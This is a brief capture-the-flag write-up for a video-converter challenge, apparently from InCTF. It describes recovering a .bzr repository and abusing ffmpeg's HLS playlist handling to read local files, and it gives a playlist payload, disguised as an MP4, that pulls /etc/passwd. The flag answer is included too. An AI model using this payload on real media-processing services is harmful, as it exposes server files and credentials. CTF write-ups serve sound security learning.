# VIDEO BAZAR
# DESCRIPTION
HI I WAS RECENTLY LEARNING ABOUT THE DIFFERENT TYPES OF VIDEOS THERE COULD BE
AND DECIDED TO MAKE A BASIC LEVEL VIDEO CONVERTER CAN U FIND ANY ERRORRS IN IT
THANKS
`flag is present in /flag`

# SHORT WRITEUP
THE FIRST PART IS BASIC .bzr file retrival using any tool 
the second part is exploiting ssrf via ffmpeg to read /flag file to a video
and download it before it gets deleted

Inside Mp4 file contnet 
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
GOD.txt
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST
```

### FLAG
`inctf{1_GU355_FFMP3G_SH0U7D_B3_S4NDB0X3D}`
